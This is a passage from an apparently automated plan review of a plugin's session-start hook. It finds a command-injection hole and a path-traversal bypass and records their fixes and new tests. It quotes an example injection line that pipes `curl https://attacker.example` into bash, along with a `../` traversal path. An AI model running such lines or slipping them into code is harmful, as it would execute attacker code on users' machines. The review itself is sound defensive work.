  The allowlist check `[[ "$resolved" == "$safe_prefix/"* ]]` only verifies that the string *starts with* `$PLUGIN_ROOT/scripts/`. It does not constrain what follows. A bang line of the form `` !`${PLUGIN_ROOT}/scripts/config-read-all-paths.sh; curl https://attacker.example | bash` `` satisfies the prefix check (the string begins with the safe prefix) but `bash -c` executes the entire string as a shell command sequence — `;`, `&&`, `|`, and `$()` all execute additional commands after the allowlisted script runs. The attack surface is any SKILL.md file writable by an attacker or any compromised dependency. Because the hook runs unconditionally at every session start, this is exploitable without the user explicitly invoking the affected skill. Fix: replace `bash -c "$resolved"` with direct execution `"$resolved"` — the allowlist already guarantees the resolved value is a trusted, executable path; no shell interpretation is needed or desirable.

- 🔴 **Security**: Lexical prefix check is bypassable via `../` path traversal
  **Location**: Phase 4: `_process_bang_lines` — allowlist prefix check
  The check `[[ "$resolved" == "$safe_prefix/"* ]]` is a lexical string comparison. A path such as `$PLUGIN_ROOT/scripts/../hooks/evil.sh` satisfies it (the string does start with `$PLUGIN_ROOT/scripts/`) while resolving to a file *outside* `$PLUGIN_ROOT/scripts/` entirely. Combined with the `bash -c` invocation, any path containing `../` after the safe prefix can redirect execution to arbitrary scripts elsewhere in the plugin tree. Fix: before the prefix check, canonicalize the first whitespace-delimited token of `$resolved` with `realpath --canonicalize-missing` (or an equivalent `cd`/`pwd` idiom), then compare the canonical form against `$safe_prefix`.

#### Major

- 🟡 **Safety**: `bash -c "$resolved"` word-splits when `$PLUGIN_ROOT` contains spaces
  **Location**: Phase 4: `_process_bang_lines` — `bash -c "$resolved"` invocation
  The substitution `${cmd/\$\{CLAUDE_PLUGIN_ROOT\}/$PLUGIN_ROOT}` embeds the raw value of `$PLUGIN_ROOT` into `$resolved` as an unquoted string. When `$PLUGIN_ROOT` contains a space (e.g. `/Users/alice/My Plugins/accelerator`), `bash -c "$resolved"` word-splits the path and fails with "No such file or directory" — silently, because the failure is swallowed by `|| true`. Direct execution `"$resolved"` does not have this problem as long as the path is stored in a variable and expanded with double-quotes.

- 🟡 **Test Coverage**: No test for the allowlist rejection path
  **Location**: Phase 4: `hooks/test-skills-detect.sh` — test cases
  The test file includes happy-path tests (skill found, skill injected, config override flows through) but no test for a bang line that points *outside* `$PLUGIN_ROOT/scripts/` being silently skipped. Without this, the allowlist's correctness is entirely untested — a regression to an unguarded execution path would go undetected.

- 🟡 **Test Coverage**: No test for the `disable-model-invocation: true` skip guard
  **Location**: Phase 4: `hooks/test-skills-detect.sh` — test cases
  The Phase 4 plan adds a `disable-model-invocation` check in the main loop but no test asserts that a skill with `disable-model-invocation: true` in its frontmatter is actually skipped and produces no output. The guard is in the plan but has no automated regression protection.

### Resolution of Pass 2 Findings

- 🔴 **Security**: `bash -c "$resolved"` metacharacter injection — **Resolved**: replaced with direct execution `"$resolved"`; `safe_prefix` is now obtained via `$(cd "$PLUGIN_ROOT/scripts" && pwd)` to produce a canonical form
- 🔴 **Security**: `../` path traversal bypasses lexical prefix check — **Resolved**: command path is canonicalized via `realpath --canonicalize-missing` before the prefix check; `../` sequences can no longer satisfy the allowlist condition
- 🟡 **Safety**: `bash -c "$resolved"` word-splits on spaces — **Resolved**: direct execution `"$resolved"` handles spaces in `$PLUGIN_ROOT` correctly
- 🟡 **Test Coverage**: No test for allowlist rejection — **Resolved**: new test added with a bang line pointing to `/bin/sh` (outside `$PLUGIN_ROOT/scripts/`), asserts `PWNED` does not appear in `additionalContext`
- 🟡 **Test Coverage**: No test for `disable-model-invocation: true` skip — **Resolved**: new test added with a fake skill carrying `disable-model-invocation: true`, asserts hook produces no output

### Assessment

All Pass 2 critical and major findings are resolved. The `_process_bang_lines` function now uses direct execution with canonical-path allowlist checking — no shell parsing, no traversal bypass, correct behaviour with spaces. The plan is acceptable as-is and ready for implementation.

*Review generated by /review-plan — Pass 2*
